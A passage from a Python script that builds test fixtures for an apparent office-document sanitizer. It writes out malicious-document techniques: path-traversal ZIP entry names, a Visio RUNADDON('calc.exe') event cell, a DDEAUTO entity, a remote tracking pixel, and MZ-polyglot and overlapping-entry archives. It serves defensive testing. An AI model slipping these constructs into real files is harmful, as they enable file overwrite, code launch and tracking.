        meta = meta.replace('<office:document-meta ', '<office:document-meta xmlns:xlink="http://www.w3.org/1999/xlink" ', 1)
    extra = ''.join([
        '<text:p><draw:frame draw:name="remote" text:anchor-type="as-char" svg:width="1cm" svg:height="1cm"><draw:image xlink:href="https://tracker.example.net/pixel.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>',
        '<text:section text:name="Linked"><text:section-source xlink:href="../shared/chapter.odt" xlink:type="simple"/><text:p>Linked text</text:p></text:section>',
        '<text:p><text:a xlink:type="simple" xlink:href="#Top">internal</text:a></text:p>',
    ])
    content = content.replace('</office:text>', extra + '</office:text>', 1)
    for prefix, uri in [('draw', 'urn:oasis:names:tc:opendocument:xmlns:drawing:1.0'), ('svg', 'urn:oasis:names:tc:opendocument:xmlns:svg-compatible:1.0'), ('xlink', 'http://www.w3.org/1999/xlink')]:
        if 'xmlns:%s=' % prefix not in content:
            content = content.replace('<office:document-content ', '<office:document-content xmlns:%s="%s" ' % (prefix, uri), 1)
    edit(lo('clean.odt'), out('docs', 'external.odt'), replace={'meta.xml': meta.encode(), 'content.xml': content.encode()})

    # OpenDocument: an encrypted package, as its manifest describes one. The content bytes stand for ciphertext.
    with zipfile.ZipFile(lo('clean.odt')) as z:
        manifest = z.read('META-INF/manifest.xml').decode()
    encrypted = manifest.replace('<manifest:file-entry manifest:full-path="content.xml" manifest:media-type="text/xml"/>',
                                 '<manifest:file-entry manifest:full-path="content.xml" manifest:media-type="text/xml" manifest:size="4051"><manifest:encryption-data manifest:checksum-type="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0#sha256-1k" manifest:checksum="AAAA"><manifest:algorithm manifest:algorithm-name="http://www.w3.org/2001/04/xmlenc#aes256-cbc" manifest:initialisation-vector="AAAAAAAAAAAAAAAAAAAAAA=="/><manifest:start-key-generation manifest:start-key-generation-name="http://www.w3.org/2000/09/xmldsig#sha256" manifest:key-size="32"/><manifest:key-derivation manifest:key-derivation-name="PBKDF2" manifest:key-size="32" manifest:iteration-count="100000" manifest:salt="AAAAAAAAAAAAAAAAAAAAAA=="/></manifest:encryption-data></manifest:file-entry>')
    if encrypted == manifest:
        sys.exit('clean.odt has no content.xml manifest entry to encrypt')
    edit(lo('clean.odt'), out('docs', 'encrypted.odt'), replace={'META-INF/manifest.xml': encrypted.encode(), 'content.xml': bytes(range(256)) * 16})

    # OpenDocument master document and database, which LibreOffice exports only from its own windows.
    with zipfile.ZipFile(lo('clean.odt')) as z:
        manifest = z.read('META-INF/manifest.xml').decode()
        content = z.read('content.xml').decode()
    master = 'application/vnd.oasis.opendocument.text-master'
    section = '<text:section text:name="Chapter1" text:protected="true"><text:section-source xlink:href="chapter1.odt" text:filter-name="writer8"/><text:p>Chapter one</text:p></text:section>'
    if 'xmlns:xlink=' not in content:
        content = content.replace('<office:document-content ', '<office:document-content xmlns:xlink="http://www.w3.org/1999/xlink" ', 1)
    edit(lo('clean.odt'), out('docs', 'master.odm'),
         replace={'mimetype': master.encode(), 'META-INF/manifest.xml': manifest.replace('application/vnd.oasis.opendocument.text"', master + '"', 1).encode(),
                  'content.xml': content.replace('<office:text>', '<office:text text:global="true">', 1).replace('</office:text>', section + '</office:text>', 1).encode()})
    odb_manifest = '<?xml version="1.0" encoding="UTF-8"?>\n<manifest:manifest xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0" manifest:version="1.3"><manifest:file-entry manifest:full-path="/" manifest:media-type="application/vnd.oasis.opendocument.base"/><manifest:file-entry manifest:full-path="content.xml" manifest:media-type="text/xml"/><manifest:file-entry manifest:full-path="settings.xml" manifest:media-type="text/xml"/><manifest:file-entry manifest:full-path="database/" manifest:media-type=""/><manifest:file-entry manifest:full-path="database/script" manifest:media-type=""/></manifest:manifest>'
    odb_content = '<?xml version="1.0" encoding="UTF-8"?>\n<office:document-content xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:db="urn:oasis:names:tc:opendocument:xmlns:database:1.0" xmlns:xlink="http://www.w3.org/1999/xlink" office:version="1.3"><office:body><office:database><db:data-source><db:connection-resource xlink:href="sdbc:embedded:hsqldb"/></db:data-source></office:database></office:body></office:document-content>'
    write_zip(out('docs', 'base.odb'), [
        ('mimetype', b'application/vnd.oasis.opendocument.base'),
        ('content.xml', odb_content.encode()),
        ('settings.xml', b'<?xml version="1.0" encoding="UTF-8"?>\n<office:document-settings xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" office:version="1.3"/>'),
        ('database/script', b'CREATE SCHEMA PUBLIC AUTHORIZATION DBA\n'),
        ('META-INF/manifest.xml', odb_manifest.encode()),
    ])

    # OpenDocument with the stored mimetype first, written with Info-ZIP zip the way the ODF specification shows.
    tree = os.path.join(TMP, 'ziptree')
    with zipfile.ZipFile(lo('clean.odt')) as z:
        z.extractall(tree)
    target = out('docs', 'infozip.odt')
    if os.path.exists(target):
        os.remove(target)
    subprocess.run(['zip', '-q', '-X', '-0', target, 'mimetype'], cwd=tree, check=True)
    subprocess.run(['zip', '-q', '-X', '-r', target, '.', '-x', 'mimetype'], cwd=tree, check=True)

    # OpenDocument whose mimetype is compressed and last.
    items = read_zip(lo('clean.odt'))
    with zipfile.ZipFile(out('docs', 'layout.odt'), 'w', zipfile.ZIP_DEFLATED) as z:
        for info, data in items[1:] + items[:1]:
            z.writestr(info.filename, data)

    # Visio, which LibreOffice reads and does not write: a clean drawing, and one with a VBA project, an event cell
    # that runs an add-on and a hyperlink to a share.
    visio('visio.vsdx', 'application/vnd.ms-visio.drawing.main+xml', '')
    visio('events.vsdm', 'application/vnd.ms-visio.drawing.macroEnabled.main+xml',
          '<Section N="Hyperlink"><Row N="Row_1"><Cell N="Address" V="\\\\fileserver\\share\\plan.vsdx"/></Row></Section><Cell N="EventDblClick" V="0" F="RUNADDON(&quot;calc.exe&quot;)"/>', vba=True)

    # Excel add-in and PowerPoint show formats, by content type over LibreOffice exports.
    retype(lo('clean.xlsx'), out('docs', 'addin.xlam'), 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml', 'application/vnd.ms-excel.addin.macroEnabled.main+xml')
    retype(lo('clean.pptx'), out('docs', 'show.ppsm'), 'application/vnd.openxmlformats-officedocument.presentationml.presentation.main+xml', 'application/vnd.ms-powerpoint.slideshow.macroEnabled.main+xml')

    # XML that the tokenizer refuses or must read.
    xml_doc = lambda body: word_document('<w:p>%s</w:p>' % run(body))
    doctype = b'<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE w:document [<!ENTITY x "DDEAUTO">]>\n' + xml_doc('&x;').split(b'\n', 1)[1]
    edit(lo('clean.docx'), out('docs', 'doctype.docx'), replace={'word/document.xml': doctype})
    edit(lo('clean.docx'), out('docs', 'malformed.docx'), replace={'word/document.xml': xml_doc('unclosed').replace(b'</w:body>', b'')})
    edit(lo('clean.docx'), out('docs', 'latin1.docx'), replace={'word/document.xml': xml_doc('caf\xe9').replace(b'encoding="UTF-8"', b'encoding="ISO-8859-1"')})
    utf16 = '\ufeff'.encode('utf-16-le') + xml_doc('sixteen').decode().replace('encoding="UTF-8"', 'encoding="UTF-16"').encode('utf-16-le')
    edit(lo('clean.docx'), out('docs', 'utf16.docx'), replace={'word/document.xml': utf16})

    # A package that is both formats.
    both = read_zip(lo('clean.docx'))
    write_zip(out('docs', 'ambiguous.docx'), [('mimetype', b'application/vnd.oasis.opendocument.text')] + [(i.filename, d) for i, d in both])


def read_zip_names(path):
    return [(i.filename, d) for i, d in read_zip(path)]


def retype(src, dst, old, new):
    items = read_zip_names(src)
    fixed = [(n, d.replace(old.encode(), new.encode()) if n == '[Content_Types].xml' else d) for n, d in items]
    if fixed == items:
        sys.exit('%s has no %s' % (src, old))
    write_zip(dst, fixed)


def visio(name, main_type, shape_cells, vba=False):
    V = 'http://schemas.microsoft.com/office/visio/2012/main'
    VR = 'http://schemas.microsoft.com/visio/2010/relationships/'
    ct = ['<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>', '<Default Extension="xml" ContentType="application/xml"/>',
          ct_override('visio/document.xml', main_type), ct_override('visio/pages/pages.xml', 'application/vnd.ms-visio.pages+xml'), ct_override('visio/pages/page1.xml', 'application/vnd.ms-visio.page+xml')]
    doc_rels = [rel('rId1', VR + 'pages', 'pages/pages.xml')]
    extra = []
    if vba:
        ct.append(ct_override('visio/vbaProject.bin', 'application/vnd.ms-office.vbaProject'))
        doc_rels.append(rel('rId2', MSR + 'vbaProject', 'vbaProject.bin'))
        extra.append(('visio/vbaProject.bin', FAKE_OLE))
    items = [
        ('[Content_Types].xml', ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">%s</Types>' % ''.join(ct)).encode()),
        ('_rels/.rels', rels(rel('rId1', VR + 'document', 'visio/document.xml'))),
        ('visio/document.xml', ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n<VisioDocument xmlns="%s" xmlns:r="%s" xml:space="preserve"><DocumentSettings/><Colors/><FaceNames/><StyleSheets/></VisioDocument>' % (V, R)).encode()),
        ('visio/_rels/document.xml.rels', rels(*doc_rels)),
        ('visio/pages/pages.xml', ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n<Pages xmlns="%s" xmlns:r="%s" xml:space="preserve"><Page ID="0" NameU="Page-1" Name="Page-1"><PageSheet><Cell N="PageWidth" V="8.5"/><Cell N="PageHeight" V="11"/></PageSheet><Rel r:id="rId1"/></Page></Pages>' % (V, R)).encode()),
        ('visio/pages/_rels/pages.xml.rels', rels(rel('rId1', VR + 'page', 'page1.xml'))),
        ('visio/pages/page1.xml', ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n<PageContents xmlns="%s" xmlns:r="%s" xml:space="preserve"><Shapes><Shape ID="1" Type="Shape"><Cell N="PinX" V="2"/><Cell N="PinY" V="9"/><Cell N="Width" V="2"/><Cell N="Height" V="1"/><Cell N="LocPinX" V="1" F="Width*0.5"/><Cell N="LocPinY" V="0.5" F="Height*0.5"/>%s<Section N="Geometry" IX="0"><Row T="RelMoveTo" IX="1"><Cell N="X" V="0"/><Cell N="Y" V="0"/></Row><Row T="RelLineTo" IX="2"><Cell N="X" V="1"/><Cell N="Y" V="0"/></Row><Row T="RelLineTo" IX="3"><Cell N="X" V="1"/><Cell N="Y" V="1"/></Row><Row T="RelLineTo" IX="4"><Cell N="X" V="0"/><Cell N="Y" V="1"/></Row><Row T="RelLineTo" IX="5"><Cell N="X" V="0"/><Cell N="Y" V="0"/></Row></Section><Text>Box</Text></Shape></Shapes></PageContents>' % (V, R, shape_cells)).encode()),
    ] + extra
    write_zip(out('docs', name), items)


# ---------- archives built byte by byte ----------

MINIMAL_DOCX = [
    ('[Content_Types].xml', b'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>'),
    ('_rels/.rels', rels(rel('rId1', RT + 'officeDocument', 'word/document.xml'))),
    ('word/document.xml', word_document('<w:p>%s</w:p>' % run('Hello'))),
]


def entry(name, data, method=8, **kw):
    e = {'name': name, 'data': data, 'method': method, 'flags': 0, 'lfh': {}, 'cd': {}, 'lfh_extra': b'', 'cd_extra': b'', 'before': b'', 'descriptor': None}
    e.update(kw)
    return e


def assemble(entries, prefix=b'', relative=False, trailing=b'', comment=b'', eocd=None, cd_offset_delta=0):
    """Lays out local headers, data, the central directory and the end record. `lfh` and `cd` override header
    fields, `before` puts bytes ahead of an entry's local header, `descriptor` appends bytes after its data."""
    buf = bytearray(prefix)
    central = bytearray()
    for e in entries:
        buf += e['before']
        raw = e['data']
        payload = e.get('payload')
        if payload is None:
            payload = zlib.compress(raw, 9)[2:-4] if e['method'] == 8 else raw
        fields = {'crc': zlib.crc32(raw) & 0xffffffff, 'csize': len(payload), 'usize': len(raw), 'method': e['method'], 'flags': e['flags'], 'name': e['name'].encode('utf-8') if isinstance(e['name'], str) else e['name']}
        offset = len(buf) - (len(prefix) if relative else 0)
        lf = dict(fields, **e['lfh'])
        buf += struct.pack('<IHHHHHIIIHH', 0x04034b50, 20, lf['flags'], lf['method'], 0, 0x21, lf['crc'], lf['csize'], lf['usize'], len(lf['name']), len(e['lfh_extra'])) + lf['name'] + e['lfh_extra']
        buf += payload
        if e['descriptor'] is not None:
            buf += e['descriptor']
        cf = dict(fields, offset=offset, disk=0)
        cf.update(e['cd'])
        central += struct.pack('<IHHHHHHIIIHHHHHII', 0x02014b50, 20, 20, cf['flags'], cf['method'], 0, 0x21, cf['crc'], cf['csize'], cf['usize'], len(cf['name']), len(e['cd_extra']), 0, cf['disk'], 0, 0, cf['offset']) + cf['name'] + e['cd_extra']
    cd_offset = len(buf) - (len(prefix) if relative else 0) + cd_offset_delta
    buf += central
    end = {'disk': 0, 'cd_disk': 0, 'count_disk': len(entries), 'count': len(entries), 'cd_size': len(central), 'cd_offset': cd_offset, 'comment_length': len(comment)}
    end.update(eocd or {})
    buf += struct.pack('<IHHHHIIH', 0x06054b50, end['disk'], end['cd_disk'], end['count_disk'], end['count'], end['cd_size'], end['cd_offset'], end['comment_length']) + comment
    buf += trailing
    return bytes(buf)


def docx_entries(**changes):
    """The minimal .docx, with keyword changes applied to word/document.xml's entry."""
    es = [entry(n, d) for n, d in MINIMAL_DOCX]
    es[2].update(changes)
    return es


def zips():
    z = lambda name, data: open(out('zip', name), 'wb').write(data)
    z('minimal.docx', assemble(docx_entries()))
    # Offsets that count the stub: readers agree, the stub is a polyglot's other half.
    z('leading-bytes.docx', assemble(docx_entries(), prefix=b'MZ' + bytes(62)))
    # Offsets that do not count the stub: only a reader that searches for the archive finds the entries.
    z('prepended.docx', assemble(docx_entries(), prefix=b'MZ' + bytes(62), relative=True))
    hidden = struct.pack('<IHHHHHIIIHH', 0x04034b50, 20, 0, 0, 0, 0x21, zlib.crc32(b'hidden') & 0xffffffff, 6, 6, 10, 0) + b'hidden.txt' + b'hidden'
    z('hidden-data.docx', assemble(docx_entries(before=hidden)))
    z('trailing-bytes.docx', assemble(docx_entries(), trailing=b'\x00' * 40))
    z('multi-disk.docx', assemble(docx_entries(), eocd={'disk': 1, 'cd_disk': 1}))
    z('count-mismatch.docx', assemble(docx_entries(), eocd={'count_disk': 4, 'count': 4}))
    z('out-of-range.docx', assemble(docx_entries(cd={'offset': 0x7fffffff})))
    z('local-name.docx', assemble(docx_entries(lfh={'name': b'word/documenx.xml'})))
    z('local-size.docx', assemble(docx_entries(lfh={'usize': 5})))
    z('local-method.docx', assemble(docx_entries(lfh={'method': 0})))
    es = docx_entries()
    es.append(entry('word/media/../../../evil.txt', b'x'))
    z('traversal.docx', assemble(es))
    es = docx_entries()
    es.append(entry('C:/evil.txt', b'x'))
    z('drive.docx', assemble(es))
    es = docx_entries()
    es.append(entry('word/media/', b'content', method=0))
    z('directory-content.docx', assemble(es))
    es = docx_entries()
    es.append(entry(b'word/caf\xe9.txt', b'x'))
    z('name-encoding.docx', assemble(es))
    z('bzip2.docx', assemble(docx_entries(method=12, payload=b'BZh9' + bytes(10))))
    z('bad-extra.docx', assemble(docx_entries(cd_extra=struct.pack('<HH', 0xcafe, 40) + b'short')))
    z('repeated-extra.docx', assemble(docx_entries(cd_extra=struct.pack('<HH', 0xcafe, 1) + b'a' + struct.pack('<HH', 0xcafe, 1) + b'b')))
    z('zip64-missing.docx', assemble(docx_entries(cd={'usize': 0xffffffff})))
    data = MINIMAL_DOCX[2][1]
    payload = zlib.compress(data, 9)[2:-4]
    z64 = struct.pack('<HHQ', 0x0001, 8, len(data))
    z('zip64-extra-length.docx', assemble(docx_entries(cd={'usize': 0xffffffff, 'csize': 0xffffffff}, cd_extra=z64)))
    z('bad-size.docx', assemble(docx_entries(lfh={'usize': len(data) + 10}, cd={'usize': len(data) + 10})))
    z('deflate-leftover.docx', assemble(docx_entries(payload=payload + b'LEFTOVER BYTES')))
    z('stored-sizes.docx', assemble(docx_entries(method=0, lfh={'csize': len(data) + 1}, cd={'csize': len(data) + 1}, payload=data + b'!')))
    # Fifield's overlap: the second entry's local header and data sit inside the first entry's stored data.
    inner_name = b'word/inner.xml'
    inner = struct.pack('<IHHHHHIIIHH', 0x04034b50, 20, 0, 0, 0, 0x21, zlib.crc32(b'<a/>') & 0xffffffff, 4, 4, len(inner_name), 0) + inner_name + b'<a/>'
    es = docx_entries()
    outer = entry('word/outer.bin', inner, method=0)
    es.append(outer)
    built = assemble(es)
    outer_data = built.index(inner)
    cd_extra_entry = struct.pack('<IHHHHHHIIIHHHHHII', 0x02014b50, 20, 20, 0, 0, 0, 0x21, zlib.crc32(b'<a/>') & 0xffffffff, 4, 4, len(inner_name), 0, 0, 0, 0, 0, outer_data) + inner_name
    end_at = built.rindex(struct.pack('<I', 0x06054b50))
    count, cd_size, cd_offset = len(es) + 1, struct.unpack('<I', built[end_at + 12:end_at + 16])[0] + len(cd_extra_entry), struct.unpack('<I', built[end_at + 16:end_at + 20])[0]
    z('overlap.docx', built[:end_at] + cd_extra_entry + struct.pack('<IHHHHIIH', 0x06054b50, 0, 0, count, count, cd_size, cd_offset, 0))
    # Data descriptors, with and without their signature, the way streaming writers leave them.
    crc = zlib.crc32(data) & 0xffffffff
    desc = struct.pack('<IIII', 0x08074b50, crc, len(payload), len(data))
    z('descriptor.docx', assemble(docx_entries(flags=8, lfh={'crc': 0, 'csize': 0, 'usize': 0}, descriptor=desc)))
    z('descriptor-nosig.docx', assemble(docx_entries(flags=8, lfh={'crc': 0, 'csize': 0, 'usize': 0}, descriptor=desc[4:])))
    z('descriptor-mismatch.docx', assemble(docx_entries(flags=8, lfh={'crc': 0, 'csize': 0, 'usize': 0}, descriptor=struct.pack('<IIII', 0x08074b50, crc, len(payload), len(data) + 1))))
    # Python's writer with ZIP64 records everywhere, and Python's streaming writer, which adds data descriptors.
    saved = (zipfile.ZIP64_LIMIT, zipfile.ZIP_FILECOUNT_LIMIT)
    zipfile.ZIP64_LIMIT, zipfile.ZIP_FILECOUNT_LIMIT = 0, 0
    try:
        with zipfile.ZipFile(out('zip', 'zip64.docx'), 'w', zipfile.ZIP_DEFLATED) as zz:
            for n, d in MINIMAL_DOCX:
                with zz.open(n, 'w', force_zip64=True) as f:
                    f.write(d)
    finally:
        zipfile.ZIP64_LIMIT, zipfile.ZIP_FILECOUNT_LIMIT = saved
    with open(out('zip', 'zip64.docx'), 'rb') as f:
        z64file = f.read()
    end_at = z64file.rindex(struct.pack('<I', 0x06054b50))
    # The end record's count, kept below the ZIP64 maximum, disagrees with the ZIP64 end record.
    z('zip64-count.docx', z64file[:end_at + 8] + struct.pack('<HH', 2, 2) + z64file[end_at + 12:])
    stream = io.BytesIO()

    class Unseekable(io.RawIOBase):
        def writable(self):
            return True

        def write(self, b):
            stream.write(b)
            return len(b)

    with zipfile.ZipFile(Unseekable(), 'w', zipfile.ZIP_DEFLATED) as zz:
        for n, d in MINIMAL_DOCX:
            # A fixed date, so a rebuild writes the same bytes.
            zz.writestr(zipfile.ZipInfo(n, date_time=(2026, 1, 1, 0, 0, 0)), d, compress_type=zipfile.ZIP_DEFLATED)
    z('streamed.docx', stream.getvalue())


# ---------- cases: one package per behavior the corpus census found ----------
#
# Each case reproduces a behavior from scratch. No corpus file, file name or path goes into the repository. This code
# writes every byte. Macro and OLE payloads are inert marker bytes, and every address uses a reserved name such as
# example.invalid. manifest.json records each file's issue, what office-defuse reports for it, and what the build
# before the fixes reported.

# The OLE signature and a marker. Enough for office-defuse, which reads no further; no OLE reader can open it.
MARKER_OLE = bytes.fromhex('d0cf11e0a1b11ae1') + b'office-defuse inert marker'
XML_DECL = b'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
P = 'http://schemas.openxmlformats.org/presentationml/2006/main'
S = 'http://schemas.openxmlformats.org/spreadsheetml/2006/main'
VML = 'application/vnd.openxmlformats-officedocument.vmlDrawing'
MAIN = {
    'docx': 'application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml',
    'docm': 'application/vnd.ms-word.document.macroEnabled.main+xml',
    'dotx': 'application/vnd.openxmlformats-officedocument.wordprocessingml.template.main+xml',
    'dotm': 'application/vnd.ms-word.template.macroEnabledTemplate.main+xml',
    'xlsx': 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml',
    'xlsm': 'application/vnd.ms-excel.sheet.macroEnabled.main+xml',
    'xlsb': 'application/vnd.ms-excel.sheet.binary.macroEnabled.main',
    'pptx': 'application/vnd.openxmlformats-officedocument.presentationml.presentation.main+xml',
    'ppam': 'application/vnd.ms-powerpoint.addin.macroEnabled.main+xml',
}


def types(overrides, defaults=()):
    d = [('rels', 'application/vnd.openxmlformats-package.relationships+xml'), ('xml', 'application/xml')] + list(defaults)
    return XML_DECL + ('<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">%s%s</Types>' % (
        ''.join('<Default Extension="%s" ContentType="%s"/>' % x for x in d), ''.join(ct_override(n, t) for n, t in overrides))).encode()


def opc(kind, main, main_xml, parts=(), overrides=(), defaults=(), package_rels=(), part_rels=None):
    """An OOXML package of `kind` whose main part is `main`. `part_rels` maps a part name to its relationships."""
    items = [('[Content_Types].xml', types([(main, MAIN[kind])] + list(overrides), defaults)),
             ('_rels/.rels', rels(rel('rId1', RT + 'officeDocument', main), *package_rels)),
             (main, main_xml)]
    for name, rs in (part_rels or {}).items():
        folder, _, base = name.rpartition('/')
        items.append(('%s_rels/%s.rels' % (folder + '/' if folder else '', base), rels(*rs)))
    return items + list(parts)


def docx(body, kind='docx', **kw):
    return opc(kind, 'word/document.xml', word_document(body), **kw)


WORKBOOK = XML_DECL + ('<workbook xmlns="%s" xmlns:r="%s"><sheets><sheet name="Sheet1" sheetId="1" r:id="rId1"/></sheets></workbook>' % (S, R)).encode()
SHEET_TYPE = 'application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml'


def xlsx(kind='xlsx', sheet='<sheetData/>', parts=(), overrides=(), defaults=(), sheet_rels=(), workbook_rels=(), package_rels=()):
    sheet_xml = XML_DECL + ('<worksheet xmlns="%s" xmlns:r="%s">%s</worksheet>' % (S, R, sheet)).encode()
    part_rels = {'xl/workbook.xml': [rel('rId1', RT + 'worksheet', 'worksheets/sheet1.xml')] + list(workbook_rels)}
    if sheet_rels:
        part_rels['xl/worksheets/sheet1.xml'] = list(sheet_rels)
    return opc(kind, 'xl/workbook.xml', WORKBOOK, parts=[('xl/worksheets/sheet1.xml', sheet_xml)] + list(parts),
               overrides=[('xl/worksheets/sheet1.xml', SHEET_TYPE)] + list(overrides), defaults=defaults, package_rels=package_rels, part_rels=part_rels)


def pptx(tree='', after='', kind='pptx', parts=(), overrides=(), defaults=(), slide_rels=()):
    presentation = XML_DECL + ('<p:presentation xmlns:p="%s" xmlns:r="%s"><p:sldIdLst><p:sldId id="256" r:id="rId1"/></p:sldIdLst></p:presentation>' % (P, R)).encode()
    slide = XML_DECL + ('<p:sld xmlns:p="%s" xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" xmlns:r="%s"><p:cSld><p:spTree>%s</p:spTree>%s</p:cSld></p:sld>' % (P, R, tree, after)).encode()
    part_rels = {'ppt/presentation.xml': [rel('rId1', RT + 'slide', 'slides/slide1.xml')]}
    if slide_rels:
        part_rels['ppt/slides/slide1.xml'] = list(slide_rels)
    return opc(kind, 'ppt/presentation.xml', presentation, parts=[('ppt/slides/slide1.xml', slide)] + list(parts),
               overrides=[('ppt/slides/slide1.xml', 'application/vnd.openxmlformats-officedocument.presentationml.slide+xml')] + list(overrides), defaults=defaults, part_rels=part_rels)


def odf(body='<office:text><text:p>Text</text:p></office:text>', media='text', files=(), unlisted=(), manifest_root='', manifest_extra=''):
    """An OpenDocument package: mimetype first and stored, content.xml, `files`, then a manifest listing them."""
    media_type = 'application/vnd.oasis.opendocument.' + media
    content = ('<?xml version="1.0" encoding="UTF-8"?>\n<office:document-content %s office:version="1.3"><office:body>%s</office:body></office:document-content>' % (NS_ODF, body)).encode()
    files = [('content.xml', content)] + list(files)
    listed = ''.join('<manifest:file-entry manifest:full-path="%s" manifest:media-type=""/>' % n for n, _ in files if n not in unlisted)
    manifest = ('<?xml version="1.0" encoding="UTF-8"?>\n%s<manifest:manifest xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0" manifest:version="1.3"><manifest:file-entry manifest:full-path="/" manifest:media-type="%s"/>%s%s</manifest:manifest>' % (
        manifest_root, media_type, listed, manifest_extra)).encode()
    return [('mimetype', media_type.encode())] + files + [('META-INF/manifest.xml', manifest)]


def entries_of(items):
    """Package items as entries for assemble(), each stored as zip_bytes() would store it."""
    return [entry(n, d, method=0 if n == 'mimetype' or n.endswith('/') else 8) for n, d in items]


def streamed(e, zip64=False):
    """An entry as a streaming writer leaves it: the data descriptor flag, the CRC and sizes zero in the local header,
    and a signed data descriptor after the data. With `zip64` the local sizes are at their maximum and its ZIP64
    field holds ones, which says the sizes are not known yet."""
    data = e['data']
    payload = zlib.compress(data, 9)[2:-4] if e['method'] == 8 else data
    crc = zlib.crc32(data) & 0xffffffff
    e.update(flags=0x0808, payload=payload)
    if zip64:
        e.update(lfh={'crc': 0, 'csize': 0xffffffff, 'usize': 0xffffffff}, lfh_extra=struct.pack('<HHQQ', 1, 16, 2 ** 64 - 1, 2 ** 64 - 1),
                 cd={'csize': 0xffffffff, 'usize': 0xffffffff}, cd_extra=struct.pack('<HHQQ', 1, 16, len(data), len(payload)),
                 descriptor=struct.pack('<IIQQ', 0x08074b50, crc, len(payload), len(data)))
    else:
        e.update(lfh={'crc': 0, 'csize': 0, 'usize': 0}, descriptor=struct.pack('<IIII', 0x08074b50, crc, len(payload), len(data)))
    return e


def biff12(rec_type, body):
    """One .xlsb record: the type and the size in seven-bit groups, then the body."""
    head = bytearray()
    for value, most in ((rec_type, 2), (len(body), 4)):
        for _ in range(most):
            head.append((value & 0x7f) | (0x80 if value > 0x7f else 0))
            value >>= 7
            if not head[-1] & 0x80:
                break
    return bytes(head) + body


def wide(text):
    return struct.pack('<I', len(text)) + text.encode('utf-16-le')


def vba(kind, folder):
    """A VBA project as Office stores one: the vbaProject part and its relationship, here an inert marker."""
    return dict(parts=[('%s/vbaProject.bin' % folder, MARKER_OLE)], overrides=[('%s/vbaProject.bin' % folder, 'application/vnd.ms-office.vbaProject')])


ACTIVEX_XML = b'<?xml version="1.0" encoding="UTF-8" standalone="no"?>\n<ax:ocx ax:classid="{D27CDB6E-AE6D-11CF-96B8-444553540000}" ax:persistence="persistStorage" r:id="rId1" xmlns:ax="http://schemas.microsoft.com/office/2006/activeX" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>'
ACTIVEX_PARTS = [('%s/activeX/activeX1.xml', ACTIVEX_XML), ('%s/activeX/_rels/activeX1.xml.rels', rels(rel('rId1', MSR + 'activeXControlBinary', 'activeX1.bin'))), ('%s/activeX/activeX1.bin', MARKER_OLE)]
ACTIVEX_TYPES = [('%s/activeX/activeX1.xml', 'application/vnd.ms-office.activeX+xml'), ('%s/activeX/activeX1.bin', 'application/vnd.ms-office.activeX')]


def activex(folder):
    return [(n % folder, d) for n, d in ACTIVEX_PARTS], [(n % folder, t) for n, t in ACTIVEX_TYPES]


def vml_drawing(shape):
    return ('<xml xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:x="urn:schemas-microsoft-com:office:excel">'
            '<o:shapelayout v:ext="edit"><o:idmap v:ext="edit" data="1"/></o:shapelayout>%s</xml>' % shape).encode()


def case_descriptor_empty_entry():
    items = odf(files=[('Configurations2/accelerator/current.xml', b''), ('styles.xml', b'<?xml version="1.0" encoding="UTF-8"?>\n<office:document-styles xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" office:version="1.3"/>')], media='spreadsheet')
    es = entries_of(items)
    return assemble([es[0]] + [streamed(e) for e in es[1:]])


def case_zip64_streamed():
    es = entries_of(odf(media='spreadsheet'))
    return assemble([es[0]] + [streamed(e, zip64=True) for e in es[1:]])


def case_vml_markers():
    parts, typed = activex('ppt')
    shape = ('<v:shape id="CheckBox1" o:spid="_x0000_s1025" type="#_x0000_t201" style="position:absolute;left:120pt;top:140pt;width:211pt;height:73pt">'
             '<![if gte mso 9]><v:imagedata o:relid="rId3" o:title=""/>\n<![endif]><o:lock v:ext="edit" aspectratio="f"/></v:shape>')
    return zip_bytes(pptx(after='<p:controls><p:control spid="1025" name="CheckBox1" r:id="rId2"/></p:controls>', defaults=[('vml', VML)],
                          parts=parts + [('ppt/drawings/vmlDrawing1.vml', vml_drawing(shape))], overrides=typed,
                          slide_rels=[rel('rId2', RT + 'control', '../activeX/activeX1.xml'), rel('rId4', RT + 'vmlDrawing', '../drawings/vmlDrawing1.vml')]))


def case_vml_br():
    shape = ('<v:shape id="_x0000_s1025" type="#_x0000_t201" o:button="t"><v:textbox><div style="text-align:center"><b>Multi<br>\nLine<br>\nText</b></div></v:textbox>'
             '<x:ClientData ObjectType="Button"><x:FmlaMacro>[0]!Button1_Click</x:FmlaMacro></x:ClientData></v:shape>')
    return zip_bytes(xlsx(sheet='<sheetData/><legacyDrawing r:id="rId1"/>', defaults=[('vml', VML)], parts=[('xl/drawings/vmlDrawing1.vml', vml_drawing(shape))],
                          sheet_rels=[rel('rId1', RT + 'vmlDrawing', '../drawings/vmlDrawing1.vml')]))


def case_vml_nul():
